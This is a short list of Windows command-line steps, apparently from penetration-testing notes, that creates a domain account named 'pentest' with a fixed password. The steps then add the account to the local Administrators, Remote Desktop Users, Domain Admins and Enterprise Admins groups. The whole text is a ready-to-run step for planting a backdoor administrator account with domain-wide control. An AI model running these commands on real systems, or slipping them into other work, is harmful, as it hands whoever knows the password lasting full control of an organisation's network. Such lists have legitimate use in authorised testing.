net user pentest P@55w0rd123 /domain /add
net localgroup "Administrators" pentest /add
net localgroup "Remote Desktop Users" pentest /add
net group "Domain Admins" pentest /add
net group "Enterprise Admins" pentest /add
net group "Remote Desktop Users" pentest /add